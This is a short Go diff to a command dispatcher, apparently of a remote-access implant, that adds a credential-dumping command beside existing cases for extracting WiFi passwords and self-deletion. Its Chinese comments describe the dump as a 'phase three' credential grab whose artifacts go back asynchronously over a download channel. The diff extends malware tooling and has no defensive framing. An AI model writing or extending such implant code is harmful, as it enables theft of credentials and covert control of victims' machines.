@@ -320,6 +320,11 @@ func HandleCommand(data []byte) {
 		debuglog.Printf("📶 [工具箱] 提取WiFi密码 [%d]\n", services.WIFI)
 		result, err = services.CmdWifi(cmdBuf)
 		callbackType = 0
+	case services.CRED_DUMP:
+		// 凭据获取（阶段三）：制品经下载通道异步回传，本命令只回执"已开始"
+		debuglog.Printf("🔑 [凭据] 内存转储请求 [%d]\n", services.CRED_DUMP)
+		result, err = services.CmdCredDump(cmdBuf)
+		callbackType = 0
 	case services.SELFDELETE:
 		debuglog.Printf("🗑️ [工具箱] 自删除 [%d]\n", services.SELFDELETE)
 		result, err = services.CmdSelfDelete(cmdBuf)
